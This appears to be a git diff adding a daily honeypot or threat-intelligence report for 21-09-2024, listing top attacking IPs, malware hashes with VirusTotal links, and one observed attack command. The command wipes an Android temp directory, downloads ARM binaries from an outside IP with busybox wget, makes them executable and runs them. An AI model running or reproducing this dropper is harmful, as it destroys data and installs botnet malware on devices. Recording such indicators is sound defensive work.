@@ -1,0 +1,27 @@
+Top 5 IPs for 21-09-2024 :
+
+119.206.117.12
+222.134.61.190
+111.67.193.157
+154.212.141.147
+149.50.106.170
+
+
+Malware Observed:
+
+04494e350e886b19e6ecc49092e12b4fff00fe76e2d751f84007f50cd14e29b1
+https://www.virustotal.com/gui/file/04494e350e886b19e6ecc49092e12b4fff00fe76e2d751f84007f50cd14e29b1
+
+81c775f9540a66fded643fe4ec53dbbf35742bd3b069d95d689da313fc9b80a9
+https://www.virustotal.com/gui/file/81c775f9540a66fded643fe4ec53dbbf35742bd3b069d95d689da313fc9b80a9
+
+8c1ca31bebe8d473cce4c0cd8da5586da2edb438436a2361cce072e526960e8a
+https://www.virustotal.com/gui/file/8c1ca31bebe8d473cce4c0cd8da5586da2edb438436a2361cce072e526960e8a
+
+e03580729f2f09dbd937d685fc9229959e84c9f329bee7eee16536bb8f9e60cf
+https://www.virustotal.com/gui/file/e03580729f2f09dbd937d685fc9229959e84c9f329bee7eee16536bb8f9e60cf
+
+
+Commands/exploits observed :
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://45.202.35.94/arm4; chmod 777 arm4; ./arm4 android; busybox wget http://45.202.35.94/arm5; chmod 777 arm5; ./arm5 android; busybox wget http://45.202.35.94/arm6; chmod 777 arm6; ./arm6 android; busybox wget http://45.202.35.94/arm7; chmod 777 arm7; ./arm7 android;
